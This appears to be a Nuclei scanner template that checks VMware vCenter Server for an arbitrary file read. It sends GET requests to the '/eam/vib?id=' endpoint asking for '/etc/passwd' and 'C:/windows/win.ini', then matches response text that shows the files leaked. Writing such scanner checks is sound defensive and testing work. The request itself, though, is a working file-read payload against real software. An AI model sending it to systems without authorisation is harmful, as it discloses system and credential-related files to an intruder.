id: vmware-vcenter-vib-arbitrary-file-read

info:
  name: VMware vCenter Server Arbitrary File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read, vmware, vcenter

variables:
  v_path:
    - "/etc/passwd"
    - "C:/windows/win.ini"

http:
  - method: GET
    path:
      - "/eam/vib?id={{v_path}}"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "root:"
          - "/bin"
        condition: and
        part: body
        negative: false
      - type: word
        words:
          - "; for 16-bit app support"
        part: body
        negative: false
      - type: word
        words:
          - "<"
        part: body
        negative: true
